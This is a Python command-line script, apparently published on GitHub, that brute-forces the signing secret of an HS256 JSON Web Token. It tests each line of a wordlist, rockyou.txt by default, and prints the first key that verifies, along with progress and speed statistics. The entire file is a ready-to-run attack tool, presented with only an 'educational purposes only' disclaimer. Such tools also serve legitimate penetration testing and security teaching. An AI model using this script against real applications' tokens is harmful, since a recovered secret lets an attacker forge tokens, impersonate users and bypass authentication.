"""
JWT Secret Brute Forcer

Author: Maxence ZOLNIERUCK
GitHub: https://github.com/mxcezl

This script checks each entry from a given file to see if it's a valid secret key for a given JWT (JSON Web Token).
This script is intended for educational purposes only.

Usage:
    python3 jwt-brute.py -t [TOKEN] -f [FILE]
"""

import jwt
import argparse
import time
from colorama import Fore, Style

def verify_token(jwt_token, secret_key):
    """Function to verify a JWT token using a secret key."""
    try:
        payload = jwt.decode(jwt_token, secret_key, algorithms=['HS256'])
        return True
    except jwt.exceptions.InvalidTokenError:
        return False

def find_secret_key(jwt_token, filepath):
    """Function to check a list of JWT tokens and return the valid one."""
    total_secrets = sum(1 for line in open(filepath, 'r', encoding='ISO-8859-1', errors='ignore'))  # Count total lines in the file
    checked_secrets = 0
    start_time = time.time()

    with open(filepath, 'r', encoding='ISO-8859-1', errors='ignore') as file:
        for line in file:
            line = line.strip()
            checked_secrets += 1
            elapsed_time = time.time() - start_time
            checks_per_second = checked_secrets / elapsed_time

            print(f"Checking secret {checked_secrets}/{total_secrets} ({(checked_secrets/total_secrets)*100:.2f}%) | {checks_per_second:.2f} checks/s", end='\r')

            if verify_token(jwt_token, line):
                print()  # Print a newline before the result
                return line

    print()  # Print a newline before the result
    return None

def check_alg(jwt_token):
    """Function to decode a JWT token without verification and check its algorithm."""
    try:
        header = jwt.get_unverified_header(jwt_token)
        return header.get('alg')
    except jwt.exceptions.InvalidTokenError:
        return None

def main():
    parser = argparse.ArgumentParser(
        description='This script checks each entry from a given file to see if it\'s a valid secret key for a given JWT (JSON Web Token).'
    )
    parser.add_argument('-t', '--token', required=True, help='Your JWT token')
    parser.add_argument('-f', '--file', help='Your file with potential secret keys')
    args = parser.parse_args()

    try:
        alg = check_alg(args.token)
        if alg != 'HS256':
            print(Fore.RED + "The JWT token is not using the HS256 algorithm.")
            return

        filepath = args.file if args.file else 'rockyou.txt'

        valid_key = find_secret_key(args.token, filepath)

        if valid_key is not None:
            print(Fore.GREEN + "Found valid secret key: " + Style.RESET_ALL + f"{valid_key}")
        else:
            print(Fore.RED + "No valid secret key found in the provided file.")

    except Exception as e:
        print(Fore.RED + "An error occurred: " + Style.RESET_ALL + f"{str(e)}")

if __name__ == "__main__":
    main()
